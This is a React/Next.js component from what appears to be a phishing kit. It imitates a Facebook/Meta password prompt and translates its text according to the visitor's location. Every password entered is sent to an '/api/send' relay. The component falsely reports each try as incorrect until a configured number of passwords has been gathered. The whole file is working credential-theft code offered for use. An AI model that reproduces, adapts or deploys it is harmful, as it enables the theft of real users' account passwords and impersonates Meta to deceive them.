import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { type FC, useEffect, useState } from 'react';

const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, messageId, messageContent, setMessageContent } = store();
    const maxPass = config.MAX_PASS ?? 3;

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['For your security, you must enter your password to continue.', 'Password', "The password that you've entered is incorrect.", 'Continue', 'Forgot your password?'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const togglePassword = () => {
        setShowPassword(!showPassword);
    };

    const handleSubmit = async () => {
        if (!password.trim() || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const passwordLine = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;

        const updatedMessage = messageContent ? `${messageContent}\n\n${passwordLine}` : passwordLine;

        setMessageContent(updatedMessage);

        try {
            await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });
        } catch (err) {
            console.error('err send:', err);
        }

        if (config.PASSWORD_LOADING_TIME) {
            await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
        }

        if (next >= maxPass) {
            nextStep();
        } else {
            setShowError(true);
            setPassword('');
        }

        setIsLoading(false);
    };

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex w-full max-w-xl flex-col items-center gap-6 rounded-3xl bg-white p-8 shadow-xl'>
                <Image src={FacebookLogoImage} alt='' className='h-15 w-15' />

                <p className='text-center text-[15px] text-gray-600'>{t('For your security, you must enter your password to continue.')}</p>

                <div className='w-full space-y-4'>
                    <div className='relative w-full'>
                        <input
                            type={showPassword ? 'text' : 'password'}
                            id='password-input'
                            value={password}
                            onChange={(e) => {
                                setPassword(e.target.value);
                                setShowError(false);
                            }}
                            className={`peer h-14 w-full rounded-xl border-2 ${showError ? 'border-red-500' : 'border-gray-300'} px-4 pt-6 pb-2 placeholder-transparent focus:border-blue-500 focus:outline-none`}
                            placeholder={t('Password')}
                        />
                        <label htmlFor='password-input' className='pointer-events-none absolute top-1/2 left-4 -translate-y-1/2 text-gray-500 transition-all duration-200 ease-in-out select-none peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                            {t('Password')}
                        </label>
                        <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-4 -translate-y-1/2 cursor-pointer text-gray-500 select-none' onClick={togglePassword} />
                    </div>

                    {showError && <p className='text-sm text-red-500'>{t("The password that you've entered is incorrect.")}</p>}

                    <button onClick={handleSubmit} disabled={isLoading || !password.trim()} className={`flex h-12 w-full items-center justify-center rounded-full bg-[#0866ff] text-[17px] font-semibold text-white transition-opacity hover:opacity-90 ${isLoading || !password.trim() ? 'cursor-not-allowed opacity-60' : ''}`}>
                        {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Continue')}
                    </button>

                    <div className='text-center'>
                        <a href='#' className='text-[15px] text-gray-600 hover:underline'>
                            {t('Forgot your password?')}
                        </a>
                    </div>
                </div>

                <div className='mt-4'>
                    <Image src={MetaLogo} alt='' className='h-5 w-auto' />
                </div>
            </div>
        </div>
    );
};

export default PasswordModal;
